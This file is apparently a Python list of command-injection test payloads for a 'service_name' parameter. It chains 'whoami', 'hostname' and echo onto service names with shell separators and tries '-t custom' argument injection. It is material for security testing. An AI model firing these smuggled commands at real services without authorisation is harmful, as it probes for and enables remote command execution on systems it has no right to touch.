payloads = [
    # Blank payload to determine legitimate use
    {"service_name": ""},

    # Command injection payloads
    {"service_name": "apache; whoami"},
    {"service_name": "mysql && whoami"},
    {"service_name": "nginx | whoami"},
    {"service_name": "ssh `whoami`"},
    {"service_name": "apache$(whoami)"},
    {"service_name": "mysql; echo $(whoami)"},
    {"service_name": "nginx && echo $(whoami)"},
    {"service_name": "ssh | echo $(whoami)"},
    {"service_name": "apache; `whoami`"},
    {"service_name": "mysql && `whoami`"},
    {"service_name": "nginx | `whoami`"},
    {"service_name": "ssh $(whoami)"},
    {"service_name": "apache; $(whoami)"},
    {"service_name": "mysql && $(whoami)"},
    {"service_name": "nginx | $(whoami)"},
    {"service_name": "ssh; whoami"},
    {"service_name": "apache && whoami"},
    {"service_name": "mysql | whoami"},
    {"service_name": "nginx `whoami`"},
    {"service_name": "ssh; echo $(whoami)"},

    # Custom command format payloads
    {"service_name": "-t custom 'whoami'"},
    {"service_name": "-t custom 'echo $(whoami)'"},
    {"service_name": "-t custom 'whoami && echo done'"},
    {"service_name": "-t custom 'whoami; echo done'"},
    {"service_name": "-t custom 'whoami | echo done'"},
    {"service_name": "-t custom 'echo done && whoami'"},
    {"service_name": "-t custom 'echo done; whoami'"},
    {"service_name": "-t custom 'echo done | whoami'"},
    {"service_name": "-t custom 'whoami && echo $(whoami)'"},
    {"service_name": "-t custom 'whoami; echo $(whoami)'"},

    # Payload to return the server name
    {"service_name": "apache; hostname"},

    # Payload to return the current value of the endpoint
    {"service_name": "apache; echo apache"}
]